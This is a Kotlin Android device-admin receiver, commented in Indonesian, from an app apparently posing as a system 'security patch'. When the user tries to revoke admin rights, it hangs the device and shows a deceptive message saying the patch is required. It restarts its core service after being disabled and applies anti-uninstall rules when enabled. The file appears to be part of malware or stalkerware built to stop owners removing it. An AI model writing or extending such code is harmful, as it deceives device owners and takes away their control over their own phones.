package com.android.security.patch

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.widget.Toast

class AdminReceiver : DeviceAdminReceiver() {

    companion object {
        fun component(ctx: Context) = ComponentName(ctx, AdminReceiver::class.java)

        fun isActive(ctx: Context): Boolean {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isAdminActive(component(ctx))
        }

        fun isDeviceOwner(ctx: Context): Boolean {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isDeviceOwnerApp(ctx.packageName)
        }
    }

    /**
     * Called ketika user coba matiin admin lewat Settings → Security → Device admin.
     * Kalau anti-uninstall ON → kita hang dan tolak.
     */
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        if (Prefs.getBool(context, Prefs.ANTI_UNINSTALL_ON)) {
            HangManager.start(context, HangManager.Reason.ADMIN_DISABLE)
        }
        return "Security patch diperlukan untuk melindungi perangkat."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        // terakhir kali — coba start ulang
        val svc = Intent(context, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(svc)
        else context.startService(svc)
    }

    override fun onEnabled(context: Context, intent: Intent) {
        // admin baru diaktifin → pasang proteksi
        if (Prefs.getBool(context, Prefs.ANTI_UNINSTALL_ON)) {
            Rules.applyAntiUninstall(context, true)
        }
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {
        // log saja, opsional
    }
}